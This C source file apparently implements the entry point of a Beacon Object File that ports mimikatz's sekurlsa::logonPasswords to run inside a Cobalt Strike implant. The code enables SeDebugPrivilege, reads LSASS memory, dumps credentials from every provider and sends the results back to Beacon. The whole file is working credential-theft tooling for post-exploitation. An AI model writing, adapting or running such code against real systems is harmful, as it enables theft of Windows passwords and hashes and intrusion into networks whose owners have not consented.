/*
 * sekurlsa_bof.c — logonpasswords (sekurlsa::logonPasswords) BOF entry point.
 *
 * go() flow: set NT version -> enable SeDebugPrivilege -> sekurlsa init ->
 * dump all providers -> clean. The LSASS read path is the "easy route"
 * (OpenProcess + ReadProcessMemory) inside kuhl_m_sekurlsa_acquireLSA().
 *
 * All output goes through kprintf() (bof_output.c), which buffers it and
 * flushes to Beacon in bulk via bof_output_flush().
 */
#include "bofdefs.h"
#include "go_common.h"
#include "globals.h"
#include "kull_m_output.h"
#include "sekurlsa/kuhl_m_sekurlsa.h"
#include "sekurlsa/kuhl_m_sekurlsa_utils.h"
#include "kull_m_process.h"

/* buffered output (bof_output.c) */
void bof_output_flush(void);

/* DFR: route unqualified advapi32 imports through the ADVAPI32$ path so the
 * CoffeeLdr resolves them via LoadLibrary+GetProcAddress. */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
#define OpenProcessToken      ADVAPI32$OpenProcessToken
#define LookupPrivilegeValueA ADVAPI32$LookupPrivilegeValueA
#define AdjustTokenPrivileges ADVAPI32$AdjustTokenPrivileges
#define CloseHandle           KERNEL32$CloseHandle

static void enable_se_debug_privilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

DECLSPEC_EXPORT void go(char* args, int len) {
    (void)args; (void)len;

    bof_get_nt_version();
    kull_m_output_init();

    enable_se_debug_privilege();
    kuhl_m_sekurlsa_init();

    kuhl_m_sekurlsa_acquireLSA();
    bof_output_flush();   /* flush any acquireLSA errors before the dump */

    kuhl_m_sekurlsa_all(0, NULL);

    kuhl_m_sekurlsa_clean();
    bof_output_flush();   /* final flush of the credential dump */
}
